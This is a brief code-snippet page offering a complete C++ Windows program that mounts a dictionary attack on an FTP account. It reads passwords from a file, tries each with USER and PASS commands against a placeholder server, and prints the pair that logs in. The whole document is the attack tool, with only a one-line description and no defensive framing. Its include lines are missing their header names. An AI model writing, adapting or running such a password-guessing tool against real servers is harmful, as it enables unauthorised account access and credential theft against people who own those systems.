Crack FTP Account using Dictionary (C++)
===

An example of how to crack an FTP account using the Dictionary attack
```cpp
//Crack FTP Account using Dictionary (C++)
#include 
#include 

int wsend(SOCKET sock,char*msg,...)
{
  char szBuffer[256];
  va_list va;
  va_start (va, msg);
  vsprintf (szBuffer, msg, va);
  va_end (va);
  return ( send(sock,szBuffer,strlen(szBuffer),0 ) );
}

BOOL CheckValidation(struct sockaddr_in sock_in,char*szUser,char*szPass)
{
  BOOL bResult=0;
  char szBuffer[256];
  SOCKET sock = socket(AF_INET, SOCK_STREAM,IPPROTO_TCP);
  if(sock!=INVALID_SOCKET)                                                                          
  if( connect(sock,(struct sockaddr*)&sock_in,sizeof(sock_in))==0)
    if(recv(sock,szBuffer,256,0)!=SOCKET_ERROR)
    if(strstr(szBuffer,"220"))
      {
        if(wsend(sock,"USER %s\r\n",szUser)!=SOCKET_ERROR)
          if(recv(sock,szBuffer,256,0)!=SOCKET_ERROR)
            if(strstr(szBuffer,"331"))
                {
                  if(wsend(sock,"PASS %s\r\n",szPass)!=SOCKET_ERROR)
                    if(recv(sock,szBuffer,256,0)!=SOCKET_ERROR)
                      if(strstr(szBuffer,"230"))
                        bResult = 1;        
                }else printf("No such user ( %s )\r\n",szUser); 
    }else printf("ftp server not ready \r\n");        
    Sleep(100);
    closesocket(sock);
  return bResult;
}
int main()
{
    char*szBuffer;
    WSADATA wdata;
    struct sockaddr_in s_in;
    s_in.sin_family=AF_INET;
    s_in.sin_port  =htons(21);
    char szFile[25]="test.txt",
        szUser[25]="UserName",
        *pntr;
    BOOL bResult=0;
    HANDLE hFile = CreateFile(szFile,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
    if(hFile!=INVALID_HANDLE_VALUE)
        {
                                    DWORD dwSize = GetFileSize(hFile,0),
                                          dwReadBytes=0;
                                    if(dwSize!=0)
                                    {
                                            szBuffer=(char*)malloc(dwSize+20);
                                            if(szBuffer!=0)
                                            {
                                                          if( ReadFile(hFile,szBuffer,dwSize,&dwReadBytes,0) )
                                                          {
                                                              if(dwReadBytes==dwSize)
                                                              {
                                                                        if ( !WSAStartup(0x202,&wdata) )
                                                                        {
                                                                            LPHOSTENT honte = gethostbyname("ftp.server.net");
                                                                            if( honte  )
                                                                            {
                                                                                s_in.sin_addr=*((LPIN_ADDR)*honte->h_addr_list);
                                                                                
                                                                                pntr=strtok(szBuffer,"\r\n");//ignore first line
                                                                                while(0 !=pntr)
                                                                                if( 0!=(pntr=strtok(NULL,"\r\n")))
                                                                                  if(CheckValidation(s_in,szUser,pntr))
                                                                                  {
                                                                                        printf("User cridentials matched .'%s' '%s' \r\n",szUser,pntr);
                                                                                        break;
                                                                                  }
                                                                                  else printf("No match with user '%s' with password '%s'\r\n",szUser,pntr);
                                                                            }else printf("Unable to resolve given address\r\n");
                                                                        }WSACleanup();                                                                            
                                                              }else printf("Failed to read complete file\r\n");
                                                          }else printf("Unable to read file\r\n");
                                                          free(szBuffer);
                                            }else printf("Unable to allocate necessary memory\r\n");    
                                    }else printf("Unable to get file size\r\n");
        }else printf("Error Opening File\r\n");
        CloseHandle(hFile);
        printf("Finished try.Press any key to exit\r\n");
        getch();
        return 0;
}

```
